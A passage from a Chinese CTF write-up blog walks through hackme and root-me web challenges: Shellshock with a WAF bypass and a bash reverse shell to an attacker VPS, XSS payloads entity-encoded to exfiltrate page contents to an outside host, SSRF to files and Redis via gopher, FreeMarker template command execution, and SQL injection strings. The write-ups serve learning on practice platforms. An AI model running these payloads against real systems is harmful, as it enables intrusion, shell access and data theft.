&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"$page.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 <code>CVE-2014-6271(破壳（shellsock）漏洞)</code> ，在freebuf中有一个链接</p>
<blockquote>
<p><a href="http://www.freebuf.com/articles/system/45390.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/45390.html</a></p>
</blockquote>
<p>国外有一个漏洞利用的文章，</p>
<blockquote>
<p><a href="https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php" target="_blank" rel="noopener">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</a></p>
</blockquote>
<p><img src="hackme/4.png" alt="exp"></p>
<p>但是直接利用会被waf掉，所以我们要考虑绕过正则</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'<span class="symbol">\(</span><span class="symbol">\)</span><span class="symbol">\s</span>*<span class="symbol">\&#123;</span><span class="symbol">\s</span>*:;<span class="symbol">\s</span>*<span class="symbol">\&#125;</span>;'</span><br></pre></td></tr></table></figure>
<p>题目的正则中 <code>:;</code> 是存在漏洞的，我们可以用 <code>: ;</code> 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 <code>\/flag</code> 我们可以利用通配符绕过，</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=<span class="string">"X-Exploit: () &#123; : ; &#125;; /bin/cat ../../../?lag-reader.c"</span> -<span class="selector-tag">q</span> -O -  <span class="string">"https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env"</span></span><br></pre></td></tr></table></figure>
<p>但是并没有出现flag，发现是因为只有root才有文件的读权限</p>
<p><img src="hackme/5.png" alt=""></p>
<p>但是题目中有一个flag-reader文件，我们尝试读取一下</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=<span class="string">"X-Exploit: () &#123; : ; &#125;; /bin/cat ../../../../../../?lag-reader.c"</span> -<span class="selector-tag">q</span> -O - <span class="string">"https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env"</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">include &lt;unistd.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">4096</span>], rnd[<span class="number">16</span>], val[<span class="number">16</span>];</span><br><span class="line">	<span class="keyword">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class="keyword">sizeof</span>(rnd), <span class="number">0</span>) != <span class="keyword">sizeof</span>(rnd)) &#123;</span><br><span class="line">		write(<span class="number">1</span>, <span class="string">"Not enough random\n"</span>, <span class="number">18</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	setuid(<span class="number">1337</span>);</span><br><span class="line">	seteuid(<span class="number">1337</span>);</span><br><span class="line">	alarm(<span class="number">1</span>);</span><br><span class="line">	write(<span class="number">1</span>, &amp;rnd, <span class="keyword">sizeof</span>(rnd));</span><br><span class="line">	read(<span class="number">0</span>, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(rnd, val, <span class="keyword">sizeof</span>(rnd)) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">		<span class="keyword">if</span>(fd &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> s = read(fd, buff, <span class="number">1024</span>);</span><br><span class="line">			<span class="keyword">if</span>(s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				write(<span class="number">1</span>, buff, s);</span><br><span class="line">			&#125;</span><br><span class="line">			close(fd);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			write(<span class="number">1</span>, <span class="string">"Can not open file\n"</span>, <span class="number">18</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		write(<span class="number">1</span>, <span class="string">"Wrong response\n"</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=<span class="string">"X-Exploit: () &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/your_vps_ip/8888 0&gt;&amp;1"</span> -<span class="selector-tag">q</span> -O -  <span class="string">"https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env"</span></span><br></pre></td></tr></table></figure>
<p>又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/content &lt; /var/tmp/content</span><br></pre></td></tr></table></figure>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cat content</span></span><br></pre></td></tr></table></figure>
<h1 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a>xssme</h1><p>先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'123'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做</p>
<p><img src="hackme/7.png" alt="payload"></p>
<p>然后在自己的ceve账号中收到回显</p>
<p><img src="hackme/6.png" alt="回显"></p>
<h1 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a>xssrf leak</h1><p>上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显</p>
<blockquote>
<p>Admin only allowed from localhost, but you came from 192.168.123.1</p>
</blockquote>
<p>修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"document.location='http://ov0eg5.ceye.io/?'+btoa(document.body.innerHTML)"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>但是遭到了过滤，我们可以考虑用HTML实体编码绕过</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#111;&amp;#118;&amp;#48;&amp;#101;&amp;#103;&amp;#53;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41;"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>果然可以收到payload，base64解码一下再保存为html格式打开</p>
<p><img src="hackme/8.png" alt=""></p>
<p>send request功能有个request.php，尝试读取该页面</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attr">onload="</span></span><br><span class="line"><span class="attr">xmlhttp=new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState==4</span> &amp;&amp; xmlhttp.<span class="attr">status==200)</span></span><br><span class="line">    &#123;</span><br><span class="line">        document.<span class="attr">location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>
<p>编码一下</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload="&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#51;&amp;#56;&amp;#46;&amp;#54;&amp;#56;&amp;#46;&amp;#50;&amp;#57;&amp;#46;&amp;#57;&amp;#50;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#51;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59;"&gt;</span><br></pre></td></tr></table></figure>
<p>然后在vps上即可收到base64字符串，解码</p>
<p><img src="hackme/9.png" alt=""></p>
<p>这应该就是题目的利用位置，我们尝试读config.php文件</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attr">onload="</span></span><br><span class="line"><span class="attr">xmlhttp=new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState==4</span> &amp;&amp; xmlhttp.<span class="attr">status==200)</span></span><br><span class="line">    &#123;</span><br><span class="line">        document.<span class="attr">location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"url=file:///var/www/html/config.php"</span>);</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>
<p>编码发送，果然可以收到flag</p>
<p><img src="hackme/10.png" alt="result"></p>
<h1 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a>xssrf redis</h1><p>题目漏洞点在于gopher未授权访问</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attr">onload="</span></span><br><span class="line"><span class="attr">xmlhttp=new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState==4</span> &amp;&amp; xmlhttp.<span class="attr">status==200)</span></span><br><span class="line">    &#123;</span><br><span class="line">        document.<span class="attr">location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit"</span>);</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现有flag，读取之</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(<span class="string">"url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit"</span>);</span><br></pre></td></tr></table></figure>
<p>然后处理一下即可得到flag</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[rootme.webserver2]]></title>
      <url>/2018/08/06/rootme1/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>接上篇writeup</p>
<a id="more"></a>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="PHP-type-juggling"><a href="#PHP-type-juggling" class="headerlink" title="PHP type juggling"></a>PHP type juggling</h2><p>PHP弱类型比较，提示<strong>类型欺骗</strong> ，查看官方文档点击 <a href="http://php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">此处</a></p>
<p>题目代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $FLAG, $USER and $PASSWORD_SHA256 in secret file</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"secret.php"</span>);</span><br><span class="line"><span class="comment">// show my source code</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$return[<span class="string">'status'</span>] = <span class="string">'Authentication failed!'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"auth"</span>]))  &#123; </span><br><span class="line">    <span class="comment">// retrieve JSON data</span></span><br><span class="line">    $auth = @json_decode($_POST[<span class="string">'auth'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// check login and password (sha256)</span></span><br><span class="line">    <span class="keyword">if</span>($auth[<span class="string">'data'</span>][<span class="string">'login'</span>] == $USER &amp;&amp; !strcmp($auth[<span class="string">'data'</span>][<span class="string">'password'</span>], $PASSWORD_SHA256))&#123;</span><br><span class="line">        $return[<span class="string">'status'</span>] = <span class="string">"Access granted! The validation password is: $FLAG"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> json_encode($return);</span><br></pre></td></tr></table></figure>
<p>关键语句如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($auth[<span class="string">'data'</span>][<span class="string">'login'</span>] == $USER &amp;&amp; !strcmp($auth[<span class="string">'data'</span>][<span class="string">'password'</span>], $PASSWORD_SHA256))&#123;</span><br><span class="line">        $return[<span class="string">'status'</span>] = <span class="string">"Access granted! The validation password is: $FLAG"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>第一个比较可以利用字符串与布尔值比较的强制类型转换绕过，即是当一个字符串与布尔真比较时会判断相等成立，第二个比较可以利用数组绕过</p>
<p><img src="rootme/1.png" alt="松散比较表"></p>
<p>PS：本题还需要注意json的赋值</p>
<p><img src="rootme/2.png" alt="payload"></p>
<h2 id="Remote-File-Inclusion"><a href="#Remote-File-Inclusion" class="headerlink" title="Remote File Inclusion"></a>Remote File Inclusion</h2><p>相关博客介绍<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">链接</a></p>
<p>在自己的vps上一个PHP文件，文件名要以<code>_lang.php</code> 结尾，例如 <code>456_lang.php</code>，写入如下内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = file_get_contents(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> $con;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后提交请求</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch13<span class="regexp">/?lang=http:/</span><span class="regexp">/your_vps_ip/</span><span class="number">456</span></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：这里的PHP文件不能是可执行的PHP文件，换句话说应该使服务器将PHP文件当做文本而不执行其代码，可以考虑使用Nginx服务器（默认不支持PHP），这样的话代码就不会被执行，然后再提交。</p>
<h2 id="Server-side-Template-Injection"><a href="#Server-side-Template-Injection" class="headerlink" title="Server-side Template Injection"></a>Server-side Template Injection</h2><p>这道题目又让我学到了新东西，这题的知识点是服务器端模板注入（SSTI），成因在于一些模板引擎对于用户输入的内容过滤不严谨，导致一些输入被当做代码执行了，类似于XSS漏洞，具体可以 <a href="http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">Click Here</a></p>
<hr>
<p>回到本题中，当我们提交内容之后</p>
<p><img src="rootme1/3.png" alt=""></p>
<p>我们输入的内容会在页面中显示，查看代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">checkNickname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		var serviceUrl = <span class="string">"check"</span>;</span><br><span class="line">		var nick = $(<span class="string">"#nickname"</span>).val();</span><br><span class="line">		var postData = <span class="string">"nickname="</span> + encodeURIComponent(nick);</span><br><span class="line">		$.ajax(&#123;</span><br><span class="line">			url : serviceUrl,</span><br><span class="line">			type : <span class="string">"POST"</span>,</span><br><span class="line">			data : postData,</span><br><span class="line">			contentType : <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">			dataType : <span class="string">"text"</span>,</span><br><span class="line">			success : function(data) &#123;</span><br><span class="line">				$(<span class="string">"#result"</span>).text(data);</span><br><span class="line">			&#125;,</span><br><span class="line">			error : function(data) &#123;</span><br><span class="line">				$(<span class="string">"#result"</span>).text(<span class="string">"An error occurs!"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>核心代码在于</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">success : function(data) &#123;</span><br><span class="line">				$(<span class="string">"#result"</span>).text(data);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>此处应该是存在漏洞点，我们尝试输入 <code>${3*3}</code> ，可以看到回显</p>
<p><img src="rootme1/4.png" alt=""></p>
<p>我们输入的3*3被成功计算执行了，说明此处是存在漏洞的，虽然漏洞发现了，但是如何构造payload我还是一头雾水，还好查到了资料<a href="http://www.vuln.cn/6934" target="_blank" rel="noopener">Click Here!</a> ，猜测这应该是FreeMarker模板（至少我看不出来，应该是我太菜了！23333），按照它的payload尝试一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; </span><br><span class="line">$&#123; ex(<span class="string">"ls -a"</span>) &#125;</span><br></pre></td></tr></table></figure>
<p>果然得到了回显！！</p>
<p><img src="rootme/5.png" alt=""></p>
<p>读取文件即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; </span><br><span class="line">$&#123; ex(<span class="string">"cat SECRET_FLAG.txt"</span>) &#125;</span><br></pre></td></tr></table></figure>
<h2 id="SQL-injection-authentication"><a href="#SQL-injection-authentication" class="headerlink" title="SQL injection - authentication"></a>SQL injection - authentication</h2><p>直接万能密码 <code>login=admin&#39;--+&amp;password=123456</code></p>
<h2 id="SQL-injection-authentication-GBK"><a href="#SQL-injection-authentication-GBK" class="headerlink" title="SQL injection - authentication - GBK"></a>SQL injection - authentication - GBK</h2><p>应该是宽字节注入，很常规，然而我被工具给坑了，换了原版的hackbar终于可以了，相关知识点可以查看我的其他文章</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login</span>=admin%df' <span class="keyword">or</span> <span class="attribute">1</span>=1%23&amp;password=12345</span><br></pre></td></tr></table></figure>
<h2 id="SQL-injection-string"><a href="#SQL-injection-string" class="headerlink" title="SQL injection - string"></a>SQL injection - string</h2><p>题目是SQLite的注入，其实很常规，But，我tmd的找错注入位置了， 还是我太菜了，注入点在search界面，由于sqlite数据库不是很熟悉，所以还费了点功夫，payload如下</p>
<ul>
<li>手工注入</li>
</ul>
<p>查看表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=asdf' or 1=2 union <span class="keyword">select</span> <span class="keyword">name</span>,<span class="number">2</span> <span class="keyword">from</span> sqlite_master<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>查看表结构</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=asdf' or 1=2 union <span class="keyword">select</span> <span class="keyword">sql</span>,<span class="number">2</span> <span class="keyword">from</span> sqlite_master<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=asdf' or 1=2 union <span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>SQLmap注入方法</li>
</ul>
